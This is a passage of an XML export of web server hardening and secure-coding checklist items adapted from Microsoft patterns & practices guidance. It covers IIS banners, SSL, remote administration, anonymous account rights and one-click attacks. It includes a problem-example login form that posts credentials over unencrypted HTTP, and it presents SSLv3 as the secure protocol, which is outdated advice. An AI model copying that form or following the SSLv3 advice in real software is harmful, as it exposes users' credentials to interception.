    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the IIS banner information is restricted by disabling the IP address in the content location.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Banner information can reveal software versions and other information that may help an attacker. Banner information can reveal the software you run, allowing an attacker to exploit known software vulnerabilities.&lt;/p&gt;
&lt;p&gt;When you retrieve a static page, for example, an .htm or a .gif file, a content location header is added to the response. By default, this content header references the IP address, and not the fully qualified domain name (FQDN). This means that your internal
 IP address is unwittingly exposed. For example, the following HTTP response header shows the IP address in bold font:&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;HTTP/1.1 200 OKServer: Microsoft-IIS/5.0&lt;br&gt;Content-Location: &lt;strong&gt;&lt;a href="http://10.1.1.1/Default.htm"&gt;http://10.1.1.1/Default.htm&lt;/a&gt;&lt;br&gt;&lt;/strong&gt;Date: Thu, 18 Feb 1999 14:03:52 GMTContent-Type: text/html&lt;br&gt;Accept-Ranges: bytesLast-Modified: Wed, 06 Jan 1999 18:56:06 GMTE&lt;br&gt;Tag: &amp;quot;067d136a639be1:15b6&amp;quot;Content-Length: 4325&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You can hide the content location returned in HTTP response headers by modifying a value in the IIS metabase to change the default behavior from exposing IP addresses, to sending the FQDN instead.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about hiding the content location in HTTP responses, see Microsoft Knowledge Base article 218180, &amp;quot;Internet Information Server Returns IP Address in HTTP Header (Content-Location).&amp;quot;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>dea54698-3b7a-4a77-a623-68e5490df744</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>SSL is Used When Transmitting Credentials</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that SSL&amp;nbsp;is used when transmitting credentials and never unencrypted connections.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using SSL prevents the credentials from being&amp;nbsp;identified or tampered with as they are transmitted over the network.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that a dedicated SSL-enabled server is used for the authentication component of your application.
&lt;/strong&gt;Ensure that your application's authentication component runs on a dedicated subdomain and a server that accepts only HTTPS traffic. Disallowing unencrypted HTTP connections will prevent accidental or malicious unsecured connections. Check that the
 server uses valid SSLv3 certificates that have been signed by a trusted certification authority. Disallowing lower SSL versions, such as SSLv1 and SSLv2 will ensure that weaker encryption methods can not be exploited by an attacker.&lt;br&gt;
&lt;br&gt;
The following URL should connect and prompt for login credentials:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;https://login.example.com/myapp/login&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;An HTTP URL to the same server and component should either be disallowed or redirect to its HTTPS counterpart:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;http://login.example.com/myapp/login&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;For more information, consult &lt;a href="http://java.sun.com/j2ee/1.4/docs/tutorial-update2/doc/Security6.html#wp509934"&gt;
Secure Socket Layer in the J2EE&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify forms that send credentials. &lt;/strong&gt;Forms are defined by a &lt;strong&gt;
&amp;lt;form&amp;gt;&lt;/strong&gt; tag in the HTML document, such as the one below:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/login&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Forms that include credentials usually, but won't always, include an input field with a
&lt;strong&gt;TYPE&lt;/strong&gt; attribute set to &lt;strong&gt;password&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;input &lt;strong&gt;type&lt;/strong&gt;=&amp;quot;&lt;strong&gt;password&lt;/strong&gt;&amp;quot; name=&amp;quot;pass&amp;quot; size=25&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that form data is sent using HTTPS. &lt;/strong&gt;Examine the &lt;strong&gt;
ACTION&lt;/strong&gt; attribute of the &lt;strong&gt;&amp;lt;form&amp;gt;&lt;/strong&gt; tag and ensure it posts to an absolute URL path and includes HTTPS in the URL, as shown below:
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; &lt;strong&gt;action&lt;/strong&gt;=&amp;quot;&lt;strong&gt;https&lt;/strong&gt;://login.example.com/myapp/login&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;In the following snippet, the credentials are transmitted over unprotected HTTP. This allows an attacker to easily sniff the traffic and steal the credentials.&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;login form&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;http://login.example.com/myapp/login&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;user&amp;quot; size=25&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;pass&amp;quot; size=25&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;log in&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ED6F49C0-E021-459E-AE4F-9116CA8E8073"&gt;Guideline: Use SSL When Transmitting Credentials (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>df857b61-edaf-4ec5-8402-a169cc6f5eb1</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Remote administration of the server is secured and configured for encryption, low session time-outs, and account lockouts.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that remote administration of the server is secured and configured for encryption, low session time-outs, and account lockouts.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Administrators often need to be able to administer multiple servers. Make sure the requirements of your remote administration solution do not compromise security. If you need remote administration capabilities, then the following recommendations help improve
 security: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Restrict the number of administration accounts&lt;/strong&gt;. This includes restricting the number of administration accounts as well as restricting which accounts are allowed to log on remotely.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Restrict the tools&lt;/strong&gt;. The main options include Internet Services Manager and Terminal Services. Another option is Web administration (using the IISAdmin virtual directory), but this is not recommended and this option is removed by IISLockdown.exe.
 Both Internet Services Manager and Terminal Services use Windows security. The main considerations here are restricting the Windows accounts and the ports you use.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Restrict the computers that are allowed to administer the server&lt;/strong&gt;. IPSec can be used to restrict which computers can connect to your Web server.
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e6d887b5-1a9e-461a-90c3-17d03fb2a5e0</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Administrators are required to log on locally OR the remote administration solution is secure.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that if local administration is performed, the administrator account to log on interactively is provided&amp;nbsp;by removing the
&lt;strong&gt;Access this computer from the network&lt;/strong&gt; privilege. &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>eaeadcd7-9f67-4ce1-938e-1e7c6b02da65</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>The anonymous account does not have write access to Web content directories and cannot execute command-line tools.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the&amp;nbsp;anonymous account does not have write access to Web content directories and cannot execute command-line tools because attackers target this well known account to perform malicious actions.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;To secure the anonymous account: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Deny write access to Web content directories&lt;/strong&gt;.
&lt;p&gt;Make sure that it is not possible for this account to write to content directories, for example, to deface Web sites.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Restrict access to System tools&lt;/strong&gt;.
&lt;p&gt;In particular, restrict access to command-line tools located in \WINNT\System32.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Assign permissions to groups instead of individual accounts&lt;/strong&gt;.
&lt;p&gt;Assigning users to groups and applying permissions to groups instead of individual accounts is good practice. For the anonymous account, create a group and add the anonymous account to it and then explicitly deny access to the group for key directories and
 files. Assigning permissions to a group allows you to more easily change the anonymous account or create additional anonymous accounts because you do not need to recreate the permissions.
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;IISLockdown denies write access to content directories for the anonymous account by applying a deny write access control entry (ACE) for the Web Anonymous Users and Web Applications groups. It also adds a deny execute ACL
 on command-line tools.&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Use separate accounts for separate applications&lt;/strong&gt;.
&lt;p&gt;If your Web server hosts multiple applications, use a separate anonymous account for each application. Add the accounts to an anonymous Web users group, for example, the
&lt;strong&gt;Web Anonymous Users&lt;/strong&gt; group created by IISLockdown, and then configure NTFS permissions using this group.
&lt;/p&gt;
&lt;p&gt;For more information about using multiple anonymous accounts and hosting multiple applications, see Chapter 20, &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302436.aspx"&gt;Hosting Multiple ASP.NET Applications&lt;/a&gt;.&amp;quot;
&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ebd306f3-91f7-4ee4-82a6-d647d15aecd5</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Unused services are disabled.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that&amp;nbsp;all unused services are disabled. Also make sure that Trivial File Transfer Protocol (TFTP) is disabled, Internet-facing administration points are removed, and ACLs are configured to limit administrative access.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ec3c05d4-7f5b-48c0-9fa4-6a29ae349e01</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>For Communication Between Servers, SSL is used When an Application Does Not Trust Other Applications on a Server</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that SSL is used for communication between servers when an application does not trust other applications on a server.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;If your servers are not inside a physically secure data center where the network eavesdropping threat is considered insignificant, you need to use an encrypted communication channel to protect data sent between servers. SSL and IPSec can both be used to
 help protect communication between servers by encrypting traffic.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use SSL when you need granular channel protection for a particular application.
&lt;/li&gt;&lt;li&gt;Use IPSec when you need protection&amp;nbsp;for all applications and services running on a computer.
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ec6a4dd8-3d21-4c65-aef7-21628ab50194</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Access to the Metabase.bin file is audited.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that access to the metabase.bin&amp;nbsp;file is audited.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Audit all failures by the Everyone group to the IIS metabase.bin file located in \WINNT\System32\inetsrv\. Do the same for the \Metabase backup folder for the backup copies of the metabase.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>ef0a7a3d-5739-47d8-9e46-0c733e158311</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Resource kit tools, utilities, and SDKs are removed.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that resource kit tools, utilities, and SDKs are removed from the Web Server if they are installed.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;SDKs and resource kits should not be installed on a production Web server. Remove them if they are present.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that only the .NET Framework Redistributable package is installed on the server and no SDK utilities are installed. Do not install Visual Studio&amp;nbsp;.NET on production servers.
&lt;/li&gt;&lt;li&gt;Ensure that access to powerful system tools and utilities, such as those contained in the \Program Files directory, is restricted. IISLockdown does this for you.
&lt;/li&gt;&lt;li&gt;Debugging tools should not be available on the Web server. If production debugging is necessary, then you should create a CD that contains the necessary debugging tools.
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f0471b48-901f-46d9-acf7-c15500392a83</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Unnecessary or unused ISAPI filters are removed from the server.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</author>
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that unnecessary or unused ISAPI filters are removed from the server.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;In the past, vulnerabilities in ISAPI filters caused significant IIS exploitation. There are no unneeded ISAPI filters after a clean IIS installation, although the .NET Framework installs the ASP.NET ISAPI filter (Aspnet_filter.dll), which is loaded into
 the IIS process address space (Inetinfo.exe) and is used to support cookie-less session state management.&lt;/p&gt;
&lt;p&gt;If your applications do not need to support cookie-less session state and they do not set the
&lt;strong&gt;cookieless&lt;/strong&gt; attribute to &lt;strong&gt;true&lt;/strong&gt; on the &lt;strong&gt;&amp;lt;sessionState&amp;gt;
&lt;/strong&gt;element, this filter can be removed.&lt;/p&gt;
&lt;p&gt;During this step, you remove unused ISAPI filters.&lt;/p&gt;
&lt;h3&gt;Remove Unused ISAPI Filters&lt;/h3&gt;
&lt;p&gt;Remove any unused ISAPI filters as explained in the following section.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To view ISAPI filters&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;To start IIS, select &lt;strong&gt;Internet Services Manager&lt;/strong&gt; from the Administrative Tools programs group.
&lt;/li&gt;&lt;li&gt;Right-click the machine (not Web site, because filters are machine wide), and then click
&lt;strong&gt;Properties&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Edit&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Click the &lt;strong&gt;ISAPI Filters&lt;/strong&gt; tab.
&lt;p&gt;The tabbed page is shown below: &lt;/p&gt;
&lt;p&gt;&lt;img src="http://msdn2.microsoft.com/en-us/library/Aa302432.f16thcm05(en-us,MSDN.10).gif" style="border:1px solid #000"&gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Removing unused ISAPI filters&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f362b5ea-cb80-412f-a9da-da17ff28de75</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Unused protocols are blocked by default.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that unused protocols are blocked by default when configuring your network firewall.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f4316f36-b9cf-42ee-86eb-eba99abd9add</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Unused HttpModules are removed.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that unused HttpModules are removed in the machine.config file.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>f527a834-7f1b-41dd-9383-d386de47b9da</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Page ViewStateUserKey is used to Counter One-click Attacks</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Parameter Manipulation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that all forms that require authentication or can be used to trigger important functionality are protected with ViewStateUserKey.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;A one-click attack consists of posting a malicious HTTP form to a known, vulnerable Web site. It is called &amp;quot;one-click&amp;quot; because it usually begins with an unaware victim clicking on an alluring link received through e-mail or found when navigating a crowded
 forum.&amp;nbsp; By following the link, the user inadvertently triggers a remote process that ends up submitting the malicious form to a site.&amp;nbsp; This allows an attacker to perform any action caused by the vulnerable form with the credentials of the victim.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ViewStateUserKey&lt;/strong&gt; makes it much harder for hackers to use the content of the client-side view state to prepare malicious posts against the site.&amp;nbsp; Each time a form is invoked, a unique key is generated.&amp;nbsp; The key contains encrypted time and
 session information, and the form submission is rejected if it is used in another session or after the session timeout has expired.
&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to check whether ViewStateUserKey is used properly:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
